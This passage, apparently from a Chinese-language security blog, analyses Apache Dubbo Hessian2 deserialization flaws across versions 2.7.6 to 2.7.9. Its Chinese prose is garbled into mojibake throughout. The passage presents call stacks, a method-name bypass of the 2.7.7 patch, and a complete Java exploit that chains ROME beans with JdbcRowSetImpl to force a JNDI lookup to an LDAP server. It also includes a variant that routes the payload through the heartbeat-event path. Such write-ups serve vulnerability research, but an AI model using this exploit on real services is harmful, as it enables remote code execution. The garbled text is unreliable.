(com.sun.rowset)<br>getDatabaseMetaData:<span class="hljs-number">4004</span>, JdbcRowSetImpl (com.sun.rowset)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">498</span>, Method (java.lang.reflect)<br>toString:<span class="hljs-number">158</span>, ToStringBean (com.rometools.rome.feed.impl)<br>toString:<span class="hljs-number">129</span>, ToStringBean (com.rometools.rome.feed.impl)<br>beanHashCode:<span class="hljs-number">198</span>, EqualsBean (com.rometools.rome.feed.impl)<br>hashCode:<span class="hljs-number">180</span>, EqualsBean (com.rometools.rome.feed.impl)<br>hash:<span class="hljs-number">339</span>, HashMap (java.util)<br>put:<span class="hljs-number">612</span>, HashMap (java.util)<br>doReadMap:<span class="hljs-number">145</span>, MapDeserializer (com.alibaba.com.caucho.hessian.io)<br>readMap:<span class="hljs-number">126</span>, MapDeserializer (com.alibaba.com.caucho.hessian.io)<br>readObject:<span class="hljs-number">2703</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)<br>readObject:<span class="hljs-number">2278</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)<br>readObject:<span class="hljs-number">2080</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)<br>readObject:<span class="hljs-number">2074</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)<br>readObject:<span class="hljs-number">92</span>, Hessian2ObjectInput (org.apache.dubbo.common.serialize.hessian2)<br>decode:<span class="hljs-number">139</span>, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)<br>decode:<span class="hljs-number">79</span>, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)<br>decode:<span class="hljs-number">57</span>, DecodeHandler (org.apache.dubbo.remoting.transport)<br>received:<span class="hljs-number">44</span>, DecodeHandler (org.apache.dubbo.remoting.transport)<br>run:<span class="hljs-number">57</span>, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher)<br>runWorker:<span class="hljs-number">1149</span>, ThreadPoolExecutor (java.util.concurrent)<br>run:<span class="hljs-number">624</span>, ThreadPoolExecutor$Worker (java.util.concurrent)<br>run:<span class="hljs-number">748</span>, Thread (java.lang)<br></code></pre></td></tr></table></figure><p>ç¯å¢ƒæ­å»ºå·ä¸ªæ‡’ï¼Œç›´æ¥è´´å›¾åˆ†æä¸€æ³¢ã€‚</p><p>å‰é¢éƒ½æ˜¯æ–¹æ³•çš„è§¦å‘è°ƒç”¨ï¼Œæˆ‘ä»¬ç›´æ¥çœ‹åˆ°<code>DecodeHandler#received</code>ï¼š</p><p><img src="/2024/09/02/Dubbo/image-20240903165421675.png" alt="image-20240903165421675"></p><p>è·Ÿè¿›åˆ°æ— å‚æ–¹æ³•ï¼š</p><p><img src="/2024/09/02/Dubbo/image-20240903165444785.png" alt="image-20240903165444785"></p><p>è¿™é‡Œçš„inputStreamæ˜¯å»æ‰Dubboåè®®å¤´çš„åŸå§‹æ•°æ®ï¼š</p><p><img src="/2024/09/02/Dubbo/image-20240903165535368.png" alt="image-20240903165535368"></p><p>æ­¤å¤„è·å–äº†æ•°æ®ä½“çš„å„ä¸ªä¿¡æ¯ï¼Œå…¶æ¬¡è¿›è¡Œæ•°æ®å¤„ç†åï¼š</p><p><img src="/2024/09/02/Dubbo/image-20240903165632577.png" alt="image-20240903165632577"></p><p>çœ‹åˆ°readObjectäº†ï¼Œè¿™é‡Œçš„inæ˜¯<code>Hessian2ObjectInput</code>è¾“å…¥æµå¯¹è±¡ï¼Œç»§ç»­è°ƒç”¨<code>readObject</code>æ–¹æ³•ï¼Œ</p><p>ç»§ç»­è°ƒç”¨<code>readObject</code>æ–¹æ³•ï¼Œä¹‹åä¼šåœ¨readObjectæ–¹æ³•è°ƒç”¨ä¸­è®¡ç®—å‡ºtagæ ‡è¯†</p><p><img src="/2024/09/02/Dubbo/image-20240903165759294.png" alt="image-20240903165759294"></p><p>ä¹‹åé€šè¿‡switch caseè¯­å¥è¿›è¡Œå¯¹åº”é€»è¾‘è°ƒç”¨:</p><p><img src="/2024/09/02/Dubbo/image-20240903165817817.png" alt="image-20240903165817817"></p><p>æ¥åˆ°äº†<code>MapDerializer#readMap</code>çš„è°ƒç”¨ï¼Œåé¢å°±æ˜¯hessiané“¾äº†ï¼š</p><p><img src="/2024/09/02/Dubbo/image-20240903165926476.png" alt="image-20240903165926476"></p><p>åç»­è·Ÿè¿›å°±ä¸å†™äº†ï¼Œå¯ä»¥å»çœ‹åŸæ–‡ç« ï¼š<a href="https://tttang.com/archive/1730/#toc_hessian">Dubboååºåˆ—åŒ–æ¼æ´åˆ†æé›†åˆ1 - è·³è·³ç³– (tttang.com)</a></p><h5 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h5><p>æ ¹æ®diffåˆ†æ</p><p><a href="https://github.com/apache/dubbo/compare/dubbo-2.7.6...dubbo-2.7.7#diff-a32630b1035c586f6eae2d778e19fc172e986bb0be1d4bc642f8ee79df48ade0L131">https://github.com/apache/dubbo/compare/dubbo-2.7.6...dubbo-2.7.7#diff-a32630b1035c586f6eae2d778e19fc172e986bb0be1d4bc642f8ee79df48ade0L131</a></p><p><img src="/2024/09/02/Dubbo/image-20240903170206345.png" alt="image-20240903170206345"></p><p>åˆ¤æ–­äº†æ–¹æ³•åæ˜¯å¦ç­‰äº<code>$invoke $echo $invokeAsync</code> ,å¦‚æœæ–¹æ³•åç§°ä¸å¯¹çš„è¯, å°±ä¼šç›´æ¥æŠ›å‡ºå¼‚å¸¸</p><h4 id="2-7-7"><a href="#2-7-7" class="headerlink" title="2.7.7"></a>2.7.7</h4><p>è™½ç„¶åœ¨2.7.7ç‰ˆæœ¬ä¸­åˆ¤æ–­äº†æ–¹æ³•åç§°, ä½†æ˜¯æˆ‘ä»¬ä»ç„¶æœ‰ç€ç»•è¿‡çš„æ€è·¯</p><p>æ—¢ç„¶ä»–çš„æ–¹æ³•ååªèƒ½å¤Ÿæ˜¯è¿™ä¸ªï¼Œé‚£æˆ‘ä»¬å°±ä½¿å¾—æ–¹æ³•åç”¨ä»–ä»¬ä¸‰ä¸ªä¸­çš„ä¸€ä¸ªå°±è¡Œäº†</p><p>æ­¥éª¤ï¼š</p><p>å°†ä¸Šé¢ç¯å¢ƒä¸­çš„pom.xmlä¸­çš„ç‰ˆæœ¬æ”¹ä¸º2.7.7</p><p>ä¸”å°†comsumerç«¯çš„æ–¹æ³•åæ”¹ä¸ºäº†<code>$echo</code>ï¼Œä¹‹åè¿è¡Œ</p><p><img src="/2024/09/02/Dubbo/image-20240903170401145.png" alt="image-20240903170401145"></p><p><img src="/2024/09/02/Dubbo/image-20240903170409243.png" alt="image-20240903170409243"></p><h4 id="2-7-8"><a href="#2-7-8" class="headerlink" title="2.7.8"></a>2.7.8</h4><h5 id="æ‰“é»˜è®¤Hessian2ååºåˆ—åŒ–"><a href="#æ‰“é»˜è®¤Hessian2ååºåˆ—åŒ–" class="headerlink" title="æ‰“é»˜è®¤Hessian2ååºåˆ—åŒ–"></a>æ‰“é»˜è®¤Hessian2ååºåˆ—åŒ–</h5><p>åœ¨è¯¥ç‰ˆæœ¬ä¸­</p><p>åœ¨<code>isGenericCall</code> å’Œ <code>isEcho</code>ä¸­æœ‰äº†æ›´å¤šçš„é™åˆ¶</p><p><img src="/2024/09/02/Dubbo/image-20240903170607800.png" alt="image-20240903170607800"></p><p>é™åˆ¶äº†ä¹‹åå‚æ•°ç±»å‹ä¸º<code>Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;</code> æˆ–è€… <code>Ljava/lang/Object;</code> çš„æ—¶å€™æ‰ä¼šç»§ç»­è¿›è¡Œååºåˆ—åŒ–æ“ä½œã€‚ä¸Šé¢çš„æ–¹æ³•å°±å¯„äº†ã€‚</p><p>ä½†æ¥ä¸‹æ¥çš„ååºåˆ—åŒ–å§¿åŠ¿å¯ä»¥ç›´æ¥ç”¨åˆ°2.7.13ï¼Œè°ƒç”¨æ ˆå¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java">connect:<span class="hljs-number">624</span>, JdbcRowSetImpl (com.sun.rowset)<br>getDatabaseMetaData:<span class="hljs-number">4004</span>, JdbcRowSetImpl (com.sun.rowset)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">498</span>, Method (java.lang.reflect)<br>toString:<span class="hljs-number">158</span>, ToStringBean (com.rometools.rome.feed.impl)<br>toString:<span class="hljs-number">129</span>, ToStringBean (com.rometools.rome.feed.impl)<br>beanHashCode:<span class="hljs-number">198</span>, EqualsBean (com.rometools.rome.feed.impl)<br>hashCode:<span class="hljs-number">180</span>, EqualsBean (com.rometools.rome.feed.impl)<br>hash:<span class="hljs-number">339</span>, HashMap (java.util)<br>put:<span class="hljs-number">612</span>, HashMap (java.util)<br>doReadMap:<span class="hljs-number">145</span>, MapDeserializer (com.alibaba.com.caucho.hessian.io)<br>readMap:<span class="hljs-number">126</span>, MapDeserializer (com.alibaba.com.caucho.hessian.io)<br>readObject:<span class="hljs-number">2733</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)<br>readObject:<span class="hljs-number">2308</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)<br>expect:<span class="hljs-number">3561</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)<br>readString:<span class="hljs-number">1883</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)<br>readUTF:<span class="hljs-number">89</span>, Hessian2ObjectInput (org.apache.dubbo.common.serialize.hessian2)<br>decode:<span class="hljs-number">103</span>, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)<br>decode:<span class="hljs-number">80</span>, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)<br>decode:<span class="hljs-number">57</span>, DecodeHandler (org.apache.dubbo.remoting.transport)<br>received:<span class="hljs-number">44</span>, DecodeHandler (org.apache.dubbo.remoting.transport)<br>run:<span class="hljs-number">57</span>, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher)<br>runWorker:<span class="hljs-number">1149</span>, ThreadPoolExecutor (java.util.concurrent)<br>run:<span class="hljs-number">624</span>, ThreadPoolExecutor$Worker (java.util.concurrent)<br>run:<span class="hljs-number">748</span>, Thread (java.lang)<br></code></pre></td></tr></table></figure><p>è·Ÿé“¾å­ä¹Ÿå·ä¸ªæ‡’å§ï¼Œä¸ç„¶æˆ‘è¦å†™çˆ†äº†â€¦.</p><p>POCï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.apache.dubbo.spring.boot.demo.consumer;<br><br><span class="hljs-keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;<br><span class="hljs-keyword">import</span> com.sun.rowset.JdbcRowSetImpl;<br><span class="hljs-keyword">import</span> org.apache.dubbo.common.io.Bytes;<br><span class="hljs-keyword">import</span> org.apache.dubbo.common.serialize.Cleanable;<br><span class="hljs-keyword">import</span> org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectOutput;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.OutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Array;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.net.Socket;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Random;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> org.apache.dubbo.common.utils.FieldUtils.setFieldValue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getPayload</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//ååºåˆ—åŒ–æ—¶ToStringBean.toString()ä¼šè¢«è°ƒç”¨ï¼Œè§¦å‘JdbcRowSetImpl.getDatabaseMetaData-&gt;JdbcRowSetImpl.connect-&gt;Context.lookup</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">jndiUrl</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ldap://127.0.0.1:1389/xitdbc&quot;</span>;<br>        <span class="hljs-type">JdbcRowSetImpl</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JdbcRowSetImpl</span>();<br>        rs.setDataSourceName(jndiUrl);<br>        rs.setMatchColumn(<span class="hljs-string">&quot;foo&quot;</span>);<br><br><span class="hljs-comment">//ååºåˆ—åŒ–æ—¶EqualsBean.beanHashCodeä¼šè¢«è°ƒç”¨ï¼Œè§¦å‘ToStringBean.toString</span><br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">item</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(JdbcRowSetImpl.class, rs);<br><br><span class="hljs-comment">//ååºåˆ—åŒ–æ—¶HashMap.hashä¼šè¢«è°ƒç”¨ï¼Œè§¦å‘EqualsBean.hashCode-&gt;EqualsBean.beanHashCode</span><br>        <span class="hljs-type">EqualsBean</span> <span class="hljs-variable">root</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EqualsBean</span>(ToStringBean.class, item);<br><br><span class="hljs-comment">//HashMap.put-&gt;HashMap.putVal-&gt;HashMap.hash</span><br>        HashMap&lt;Object, Object&gt; s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        setFieldValue(s, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>        Class&lt;?&gt; nodeC;<br>        <span class="hljs-keyword">try</span> &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( ClassNotFoundException e ) &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);<br>        &#125;<br>        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>        nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br>        Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, root, root, <span class="hljs-literal">null</span>));<br>        Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, root, root, <span class="hljs-literal">null</span>));<br>        setFieldValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br><br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] header = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">16</span>];<br>        Bytes.short2bytes((<span class="hljs-type">short</span>) <span class="hljs-number">0xdabb</span>, header);<br>        header[<span class="hljs-number">2</span>] = (<span class="hljs-type">byte</span>) ((<span class="hljs-type">byte</span>) <span class="hljs-number">0x80</span> | <span class="hljs-number">2</span>);<br>        Bytes.long2bytes(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>().nextInt(<span class="hljs-number">100000000</span>), header, <span class="hljs-number">4</span>);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">hessian2ByteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">Hessian2ObjectOutput</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2ObjectOutput</span>(hessian2ByteArrayOutputStream);<br>        out.writeObject(getPayload());<br><br>        out.flushBuffer();<br>        <span class="hljs-keyword">if</span> (out <span class="hljs-keyword">instanceof</span> Cleanable) &#123;<br>            ((Cleanable) out).cleanup();<br>        &#125;<br>        Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, <span class="hljs-number">12</span>);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        byteArrayOutputStream.write(header);<br>        byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());<br>        <span class="hljs-type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();<br><br>        <span class="hljs-meta">@SuppressWarnings( &quot;resource&quot;)</span><br>        <span class="hljs-type">Socket</span> <span class="hljs-variable">socket</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Socket</span>( <span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">9999</span>) ;<br>        <span class="hljs-type">OutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> socket.getOutputStream();<br>        outputStream.write(bytes);<br>        outputStream.flush() ;<br>        outputStream.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="Hessian2-way-2"><a href="#Hessian2-way-2" class="headerlink" title="Hessian2 way 2"></a>Hessian2 way 2</h5><p>å¦ä¸€ç§åˆ©ç”¨æ–¹å¼å°±æ˜¯åœ¨Dubboåè®®è§£æçš„ä½ç½®</p><p><code>org.apache.dubbo.remoting.exchange.codec.ExchangeCodec#decode</code>æ–¹æ³•ä¸­</p><p><img src="/2024/09/02/Dubbo/image-20240903171016078.png" alt="image-20240903171016078"></p><p>Dubboæ ¼å¼ï¼š</p><p><img src="/2024/09/02/Dubbo/image-20240903171032624.png" alt="image-20240903171032624"></p><p>å¼€å¤´çš„magicä½ç±»ä¼¼javaå­—èŠ‚ç æ–‡ä»¶é‡Œçš„é­”æ•°ï¼Œç”¨æ¥åˆ¤æ–­æ˜¯ä¸æ˜¯dubboåè®®çš„æ•°æ®åŒ…ï¼Œé­”æ•°æ˜¯å¸¸é‡0xdabbï¼Œç”¨äºåˆ¤æ–­æŠ¥æ–‡çš„å¼€å§‹</p><p>å‡½æ•°åœ¨è§£ædubboåè®®æ—¶å…ˆåˆ¤æ–­è¯·æ±‚å¤´æ˜¯å¦æ˜¯é­”æœ¯å­—0xdabb</p><p>å½“é­”æœ¯å¤´æ ¡éªŒé€šè¿‡åï¼Œå°†ä¼šè°ƒç”¨<code>decodeBody</code>æ–¹æ³•</p><p><img src="/2024/09/02/Dubbo/image-20240903171113020.png" alt="image-20240903171113020"></p><p>å‡½æ•°è·å–flagæ ‡å¿—ä½ï¼Œä¸€å…±8ä¸ªåœ°å€ä½ã€‚</p><p>ä½å››ä½ç”¨æ¥è¡¨ç¤ºæ¶ˆæ¯ä½“æ•°æ®ç”¨çš„åºåˆ—åŒ–ç±»å‹ï¼ˆé»˜è®¤hessianï¼‰ï¼Œé«˜å››ä½ä¸­ï¼Œç¬¬ä¸€ä½ä¸º1è¡¨ç¤ºæ˜¯requestè¯·æ±‚ï¼Œç¬¬äºŒä½ä¸º1è¡¨ç¤ºåŒå‘ä¼ è¾“ï¼ˆå³æœ‰è¿”å›responseï¼‰ï¼Œç¬¬ä¸‰ä½ä¸º1è¡¨ç¤ºæ˜¯å¿ƒè·³äº‹ä»¶ã€‚è°ƒç”¨ç›¸åº”çš„ååºåˆ—åŒ–å‡½æ•°å¯¹æ•°æ®æµè¿›è¡Œååºåˆ—åŒ–æ“ä½œ</p><p>å½“æœåŠ¡ç«¯åˆ¤æ–­æ¥æ”¶åˆ°çš„ä¸ºäº‹ä»¶æ—¶ï¼Œä¼šè°ƒç”¨<code>decodeHeartbeatData</code>ï¼Œè·Ÿè¿›å‘ç°è°ƒç”¨äº†<code>decodeEventData</code>æ–¹æ³•ï¼Œæ¥ç€è°ƒç”¨äº†ä¸€ä¸ª<code>in.readObject()</code>ï¼Œå†åˆ°<code>readObject()</code>ã€‚</p><p>ç¨å¾®å°†å‰é¢çš„payloadä¿®æ”¹ä¸€ä¸‹å°†flagç½®ä¸ºeventäº‹ä»¶å°±ä¼šè§¦å‘æ¼æ´</p><p>è°ƒç”¨æ ˆï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java">connect:<span class="hljs-number">624</span>, JdbcRowSetImpl (com.sun.rowset)<br>getDatabaseMetaData:<span class="hljs-number">4004</span>, JdbcRowSetImpl (com.sun.rowset)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">498</span>, Method (java.lang.reflect)<br>toString:<span class="hljs-number">158</span>, ToStringBean (com.rometools.rome.feed.impl)<br>toString:<span class="hljs-number">129</span>, ToStringBean (com.rometools.rome.feed.impl)<br>beanHashCode:<span class="hljs-number">198</span>, EqualsBean (com.rometools.rome.feed.impl)<br>hashCode:<span class="hljs-number">180</span>, EqualsBean (com.rometools.rome.feed.impl)<br>hash:<span class="hljs-number">339</span>, HashMap (java.util)<br>put:<span class="hljs-number">612</span>, HashMap (java.util)<br>doReadMap:<span class="hljs-number">145</span>, MapDeserializer (com.alibaba.com.caucho.hessian.io)<br>readMap:<span class="hljs-number">126</span>, MapDeserializer (com.alibaba.com.caucho.hessian.io)<br>readObject:<span class="hljs-number">2733</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)<br>readObject:<span class="hljs-number">2308</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)<br>readObject:<span class="hljs-number">94</span>, Hessian2ObjectInput (org.apache.dubbo.common.serialize.hessian2)<br>readEvent:<span class="hljs-number">83</span>, ObjectInput (org.apache.dubbo.common.serialize)<br>decodeEventData:<span class="hljs-number">400</span>, ExchangeCodec (org.apache.dubbo.remoting.exchange.codec)<br>decodeBody:<span class="hljs-number">122</span>, DubboCodec (org.apache.dubbo.rpc.protocol.dubbo)<br>decode:<span class="hljs-number">122</span>, ExchangeCodec (org.apache.dubbo.remoting.exchange.codec)<br>decode:<span class="hljs-number">82</span>, ExchangeCodec (org.apache.dubbo.remoting.exchange.codec)<br>decode:<span class="hljs-number">48</span>, DubboCountCodec (org.apache.dubbo.rpc.protocol.dubbo)<br>decode:<span class="hljs-number">85</span>, NettyCodecAdapter$InternalDecoder (org.apache.dubbo.remoting.transport.netty4)<br>decodeRemovalReentryProtection:<span class="hljs-number">498</span>, ByteToMessageDecoder (io.netty.handler.codec)<br>callDecode:<span class="hljs-number">437</span>, ByteToMessageDecoder (io.netty.handler.codec)<br>channelRead:<span class="hljs-number">276</span>, ByteToMessageDecoder (io.netty.handler.codec)<br>invokeChannelRead:<span class="hljs-number">379</span>, AbstractChannelHandlerContext (io.netty.channel)<br>invokeChannelRead:<span class="hljs-number">365</span>, AbstractChannelHandlerContext (io.netty.channel)<br>fireChannelRead:<span class="hljs-number">357</span>, AbstractChannelHandlerContext (io.netty.channel)<br>channelRead:<span class="hljs-number">1410</span>, DefaultChannelPipeline$HeadContext (io.netty.channel)<br>invokeChannelRead:<span class="hljs-number">379</span>, AbstractChannelHandlerContext (io.netty.channel)<br>invokeChannelRead:<span class="hljs-number">365</span>, AbstractChannelHandlerContext (io.netty.channel)<br>fireChannelRead:<span class="hljs-number">919</span>, DefaultChannelPipeline (io.netty.channel)<br>read:<span class="hljs-number">163</span>, AbstractNioByteChannel$NioByteUnsafe (io.netty.channel.nio)<br>processSelectedKey:<span class="hljs-number">714</span>, NioEventLoop (io.netty.channel.nio)<br>processSelectedKeysOptimized:<span class="hljs-number">650</span>, NioEventLoop (io.netty.channel.nio)<br>processSelectedKeys:<span class="hljs-number">576</span>, NioEventLoop (io.netty.channel.nio)<br>run:<span class="hljs-number">493</span>, NioEventLoop (io.netty.channel.nio)<br>run:<span class="hljs-number">989</span>, SingleThreadEventExecutor$<span class="hljs-number">4</span> (io.netty.util.concurrent)<br>run:<span class="hljs-number">74</span>, ThreadExecutorMap$<span class="hljs-number">2</span> (io.netty.util.internal)<br>run:<span class="hljs-number">30</span>, FastThreadLocalRunnable (io.netty.util.concurrent)<br>run:<span class="hljs-number">748</span>, Thread (java.lang)<br></code></pre></td></tr></table></figure><p>payloadä¿®æ”¹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] header = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">16</span>];<br>Bytes.short2bytes((<span class="hljs-type">short</span>) <span class="hljs-number">0xdabb</span>, header);<br><span class="hljs-comment">//        header[2] = (byte) ((byte) 0x80 | 2);</span><br>header[<span class="hljs-number">2</span>] = (<span class="hljs-type">byte</span>) ((<span class="hljs-type">byte</span>) <span class="hljs-number">0x80</span> | <span class="hljs-number">0x20</span> | <span class="hljs-number">2</span>);<br>Bytes.long2bytes(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>().nextInt(<span class="hljs-number">100000000</span>), header, <span class="hljs-number">4</span>);<br></code></pre></td></tr></table></figure><h4 id="2-7-9"><a href="#2-7-9" class="headerlink" 